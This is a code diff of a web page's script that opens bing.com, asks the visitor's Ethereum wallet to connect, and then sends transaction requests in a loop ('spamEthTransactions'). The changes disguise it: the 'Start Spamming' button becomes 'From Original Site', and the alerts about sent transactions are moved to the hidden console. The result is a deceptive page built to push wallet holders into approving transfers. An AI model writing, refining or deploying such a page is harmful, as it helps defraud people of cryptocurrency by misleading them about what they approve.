@@ -21,16 +21,16 @@
   <script>
     let spamming = false; // Flag to control the spamming
 
-    async function openBingAndPromptTransaction() {
+    async function openBingAndPromptWallet() {
       // Open bing.com
       window.open('https://bing.com', 'x');
 
       // Check for wallet connection
-      const connected = await promptWalletConnection();
+      await promptWalletConnection();
 
-      // If wallet connected, start spamming Ethereum transactions
+      // Start spamming Ethereum transactions if wallet is connected
       if (connected) {
-        spamming = true; // Set the flag to true
+        spamming = true;
         spamEthTransactions();
       }
     }
@@ -38,24 +38,17 @@
     async function promptWalletConnection() {
       if (typeof window.ethereum !== 'undefined') {
         try {
-          // Check if wallet is already connected
-          const accounts = await ethereum.request({ method: 'eth_accounts' });
-
-          if (accounts.length > 0) {
-            return true; // Wallet already connected
-          }
-
           // Request wallet connection
           await ethereum.request({ method: 'eth_requestAccounts' });
           alert('Wallet connected successfully!');
-          return true; // Wallet connected
+          connected = true; // Set connected to true after successful connection
         } catch (error) {
           alert('Wallet connection request rejected by the user.');
-          return false; // Wallet not connected
+          connected = false; // Set connected to false on rejection
         }
       } else {
         alert('Web3 (Ethereum provider) is not available in this browser.');
-        return false; // Wallet not connected
+        connected = false; // Set connected to false if Web3 is not available
       }
     }
 
@@ -77,9 +70,9 @@
           params: [transactionParameters],
         });
 
-        alert(`Transaction sent: ${txHash}`);
+        console.log(`Transaction sent: ${txHash}`);
       } catch (error) {
-        alert('Ethereum transaction request failed or was rejected.');
+        console.error('Ethereum transaction request failed or was rejected.');
       }
     }
 
@@ -94,9 +87,11 @@
     function stopSpamming() {
       spamming = false;
     }
+
+    let connected = false; // Initialize connected flag as false
   </script>
   <center>
-    <input type="button" class="button" value="Start Spamming" onclick="openBingAndPromptTransaction()">
+    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
     <input type="button" class="button" value="Stop Spamming" onclick="stopSpamming()">
   </center>
 </body>
